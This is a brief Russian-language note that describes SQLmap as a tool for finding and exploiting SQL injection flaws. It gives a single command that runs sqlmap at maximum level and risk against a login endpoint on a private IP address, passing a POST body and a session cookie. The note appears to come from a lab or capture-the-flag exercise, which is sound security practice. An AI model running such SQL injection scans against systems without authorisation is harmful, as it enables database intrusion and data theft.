# SQLmap - инструмент для автоматического обнаружения и использования уязвимостей в базах данных SQL

sqlmap -u "http://10.48.154.133/functions.php" --data="username=test&password=test&function=login" --method POST --batch --level 3 --risk 3 --cookie="PHPSESSID=7g22l69945tdc3ojo2g4fjue7j"